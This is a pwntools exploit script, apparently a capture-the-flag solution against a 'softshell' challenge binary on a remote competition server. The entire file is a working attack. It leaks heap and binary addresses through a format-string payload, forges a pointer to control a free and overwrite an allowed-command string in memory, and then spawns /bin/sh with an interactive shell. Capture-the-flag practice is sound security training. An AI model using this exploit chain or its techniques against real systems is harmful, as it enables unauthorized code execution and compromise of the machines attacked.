from pwn import *

exe = ELF("./softshell")

# p = process("./softshell")
# gdb.attach(p)

p = remote("chal.pctf.competitivecyber.club", 8888)

context.binary = exe

p.recvuntil(b">>")
p.sendline(b"1")
p.recvuntil(b">>")
p.sendline(b"%6$p %15$p")
p.recvuntil(b">>")
p.sendline(b"AAAA")

p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b">>")
p.sendline(b"0")
p.recvuntil(b">>")
p.sendline(b"0")

heap_leak = int(p.recvline().strip(),16)
log.info(f"{hex(heap_leak)=}")

p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b">>")
p.sendline(b"0")
p.recvuntil(b">>")
p.sendline(b"1")

exe_leak = int(p.recvline().strip(),16)
exe_base = exe_leak - 0x1e89 # remote
# exe_base = exe_leak - 0x1e8c # local
log.info(f"{hex(exe_base)=}")

allowed_str_addr = exe_base + 0x4020
log.info(f"{hex(allowed_str_addr)=}")

tag_ptr = heap_leak + 0x210
log.info(f"address of tag_ptr for cmd 2: {hex(tag_ptr)}")

p.recvuntil(b">>")
p.sendline(b"1")
p.recvuntil(b">>")
p.sendline(b"A"*0x18 + b" " + b"B"*0x18)
p.recvuntil(b">>")
p.sendline(b"C"*8)

tag_ptr=str(hex(tag_ptr))

payload_for_free = b" " + bytes.fromhex(tag_ptr[12:14]) +bytes.fromhex(tag_ptr[10:12]) +bytes.fromhex(tag_ptr[8:10]) +bytes.fromhex(tag_ptr[6:8]) +bytes.fromhex(tag_ptr[4:6]) +bytes.fromhex(tag_ptr[2:4]) + b" " + b"E"*4 + b" " + b"F"*0x4 + b" "
# log.info(f"{payload_for_free=}")

p.recvuntil(b">>")
p.sendline(b"1")
p.recvuntil(b">>")
p.sendline(payload_for_free) # need 3 args to control free
p.recvuntil(b">>")
p.sendline(b"G"*8)

p.recvuntil(b">>") # free tag pointer
p.sendline(b"5")
p.recvuntil(b">>")
p.sendline(b"2")

allowed_str_addr=str(hex(allowed_str_addr))
byte_addr_allowed = bytes.fromhex(allowed_str_addr[12:14]) + bytes.fromhex(allowed_str_addr[10:12]) + bytes.fromhex(allowed_str_addr[8:10]) + bytes.fromhex(allowed_str_addr[6:8]) + bytes.fromhex(allowed_str_addr[4:6]) + bytes.fromhex(allowed_str_addr[2:4]) + b"\x00\x00"
log.info(f"{byte_addr_allowed=}")

p.recvuntil(b">>") 
p.sendline(b"4")
p.recvuntil(b">>")
p.sendline(b"1") 
p.recvuntil(b">>")
p.sendline(b"y") # creates a 0x30 chunk
p.recvuntil(b">>")
p.sendline(byte_addr_allowed) 

p.recvuntil(b">>") # edit allowed string in .data
p.sendline(b"3")
p.recvuntil(b">>")
p.sendline(b"2") 
p.recvuntil(b">>")
p.sendline(b"/bin/sh")

p.recvuntil(b">>") # create command
p.sendline(b"1")
p.recvuntil(b">>")
p.sendline(b"/bin/sh")
p.recvuntil(b">>")
p.sendline(b"yey")

p.recvuntil(b">>") # run it
p.sendline(b"4")
p.recvuntil(b">>")
p.sendline(b"3")

p.interactive()